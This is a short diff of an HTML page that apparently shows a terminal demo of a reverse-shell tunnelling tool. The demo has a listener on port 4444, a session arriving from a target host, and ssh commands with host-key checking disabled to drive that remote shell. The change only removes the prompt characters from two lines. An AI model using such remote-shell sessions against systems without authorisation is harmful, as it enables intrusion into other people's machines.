@@ -98,8 +98,8 @@
 <span class="ln" data-step="3"><span class="s">[ok]</span> listening on 0.0.0.0:4444</span>
 <span class="ln o">··· shell-tunnel.exe runs on the target ···</span>
 <span class="ln" data-step="4"><span class="s">[ok]</span> Session 1: svc on web01 (from 10.10.11.23), reachable via 127.0.0.1:4444</span>
-<span class="ln o">$ ssh -fNM -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span>
-<span class="ln o">$ ssh -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1</span>
+<span class="ln o">ssh -fNM -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span>
+<span class="ln o">ssh -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1</span>
 
 <span class="ln"><span class="p">$</span> <span class="t">ssh -fNM -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span></span>
 <span class="ln"><span class="p">$</span> <span class="t">ssh -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1</span></span>
